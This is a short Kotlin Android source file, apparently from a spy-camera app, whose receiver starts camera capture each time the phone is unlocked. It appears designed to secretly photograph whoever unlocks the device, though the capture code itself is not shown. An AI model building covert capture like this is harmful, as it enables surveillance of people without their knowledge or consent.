package com.spylab.spycam.remote

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.spylab.spycam.util.ProcessHelper

class UnlockReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Log.d("UnlockReceiver", "ACTION_USER_PRESENT " + intent.action)

        when {
            intent.action == Intent.ACTION_USER_PRESENT -> {
                //user unlocked the phone - start cam service
                Log.d("UnlockReceiver", "ACTION_USER_PRESENT")
                ProcessHelper.startCameraCapture(context)
            }
            intent.action == Intent.ACTION_SCREEN_ON -> Log.d("UnlockReceiver", "ACTION_SCREEN_ON")
            else -> throw UnsupportedOperationException("Not yet implemented")
        }
    }


    private fun startCameraService(context: Context) {
        val intent = Intent(context, CameraService::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startService(intent)
    }

}
